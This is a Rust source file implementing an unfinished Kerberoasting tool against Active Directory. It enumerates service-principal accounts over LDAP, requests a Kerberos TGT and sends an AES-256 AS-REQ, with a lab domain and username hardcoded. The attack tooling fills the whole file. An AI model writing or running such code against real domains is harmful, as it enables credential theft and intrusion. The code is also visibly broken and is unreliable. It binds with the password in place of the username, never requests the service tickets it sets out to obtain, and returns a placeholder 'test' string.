use ascii::AsciiString;
use kerbeiros::*;
use kerberos_ccache::CCache;
use ldap3::{LdapConn, LdapResult, ResultEntry, Scope, SearchEntry, SearchResult};
use kerberos_constants::etypes::AES256_CTS_HMAC_SHA1_96;
use std::fs;
use std::net::*;

fn find_spn_accounts(
    bind_dn: &str,
    password: &str,
    dc_ip: &str,
    use_ssl: Option<bool>,
) -> Vec<ResultEntry> {
    //username: &str, password: &str, dc_ip: Option<String>, domain: Option<String>, use_ssl: bool) {

    let use_ssl = use_ssl.unwrap_or(false);
    let ldap_port: u16 = match use_ssl {
        true => 636,
        _ => 389,
    };

    let ldap = LdapConn::new(format!("ldap://{dc_ip}:{ldap_port}").as_str());
    let mut ldapcon = match ldap {
        Ok(l) => l,
        Err(r) => panic!("{}", r),
    };
    ldapcon.simple_bind(&bind_dn, password).unwrap();
    //"CN=maik ro,CN=Users,DC=snackempire,DC=home"

    // filter for user accounts with a SPN, that are not the krbtgt account not and disabled
    let filter = "(&(objectClass=user)(servicePrincipalName=*)(!(objectCategory=computer))(!(cn=krbtgt))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))";
    //let filter = format!("(&(objectClass=user)(displayName={}))", displayname);

    //let filter = "(objectclass=user)";
    println!("filter: {}", filter);
    let res = ldapcon
        .search(
            "DC=snackempire,DC=home",
            Scope::Subtree,
            &filter[..],
            vec!["dn"],
        )
        .unwrap();

    let (re, _ldapresult) = res.success().unwrap();

    re
}

fn find_bind_dn_from_displayname(
    displayname: &str,
    domain: &str,
    auth_username: &str,
    auth_password: &str,
    ldap_ip: &str,
    ldap_port: &str,
) -> String {
    let domain_dn = convert_domain_to_dn(domain);
    let ldap = LdapConn::new(format!("ldap://{ldap_ip}:{ldap_port}").as_str());
    let mut distinguished_name = String::new();
    let mut ldapcon = match ldap {
        Ok(l) => l,
        Err(r) => panic!("{}", r),
    };
    // first we try anonymous binding without credentials
    match ldapcon.simple_bind("", "") {
        Ok(_) => {
            println!("Anonymous bind successful");
            ldapcon.simple_bind(auth_username, auth_password).unwrap();

            let filter = format!("(&(objectClass=user)(displayName={}))", displayname);
            println!("filter: {}", filter);
            let res = ldapcon
                .search(&domain_dn, Scope::Subtree, &filter[..], vec!["dn"])
                .unwrap();
            let (re, _ldapresult) = res.success().unwrap();
            distinguished_name = SearchEntry::construct(re[0].clone()).dn;
        }
        Err(err) => {
            println!("Anonymous bind failed, attempting with credentials");

            // ok, anonymous binding was a mistake, lets try the authenticated version of it
            let bind_result = ldapcon.simple_bind(auth_password, auth_password);

            match bind_result {
                Ok(_) => {
                    println!("Bind with credentials successful");
                }
                Err(err) => {
                    println!("Bind with credentials failed: {}", err);
                }
            }
        }
    }

    println!("{:?}", distinguished_name);
    distinguished_name
}

fn convert_domain_to_dn(domain: &str) -> String {
    let parts = domain
        .split(".")
        .map(|part| format!("dc={part}"))
        .collect::<Vec<_>>();
    parts.join(",")
}

pub fn kerberoast(username: &str, password: &str, domain: &str, dc_ip: &str) -> String {
    let distinguished_name =
        find_bind_dn_from_displayname(&username, &domain, &username, &password, &dc_ip, "389");

    let spn_accounts = find_spn_accounts(&distinguished_name, password, dc_ip, Some(false));

    let mut result = Vec::new();

    for i in spn_accounts {
        result.push(format!("{:#?}", SearchEntry::construct(i).dn));
    }
    println!("{:?}", result);

    let username = AsciiString::from_ascii(username).unwrap();
    let user_password = Key::Password(password.to_string());
    // realm needs to be a box because otherwise we cannot use it twice (asciistring does not implement copy/clone 😅)
    let realm = Box::new(AsciiString::from_ascii(domain).unwrap()); //AsciiString::from_ascii("SNACKEMPIRE.HOME").unwrap();

    let kdc_address = Some(IpAddr::V4(dc_ip.parse::<Ipv4Addr>().unwrap())).unwrap(); // Ipv4Addr::new(kdc_ip.parse()::Ipv4Addr)() //dc_ip[0], dc_ip[1], dc_ip[2], dc_ip[3])));

    // request TGT
    let tgt_requester = TgtRequester::new(*(realm.clone()), kdc_address);

    let credential = tgt_requester
        .request(&username, Some(&user_password))
        .unwrap();

    let filename = format!("{}_tgt.ccache", username);
    credential.save_into_ccache_file(&filename).unwrap();

    // load ticket from disk
    let ticket = fs::read(&format!("./{}_tgt.ccache", username)).expect("Unable to read file");

    let _parsed_ticket = CCache::parse(&ticket)
        .expect("Unable to parse ticket content")
        .1;

    println!("TGT saved and loaded");

    let mut as_requester = kerbeiros::AsRequester::new(*realm, kdc_address.clone());

    // Use AES-256 cipher
    as_requester.set_etype(AES256_CTS_HMAC_SHA1_96).unwrap();

    //println!("{:x}", as_requester.kdc_options());
    let username1 = AsciiString::from_ascii("maikroservice").unwrap();

    let response = as_requester.request(&username1, Some(&user_password)).unwrap();

    match response {
        AsReqResponse::KrbError(krb_error) => {
            println!("KRB-ERROR with error code = {}", krb_error.error_code);
        }
        AsReqResponse::AsRep(as_rep) => {
            let ticket = as_rep.ticket;
            println!("Ticket obtained for service {}", ticket.sname);
            println!("{:?}", ticket);
        }
    }

    format!("{:?}", "test")

}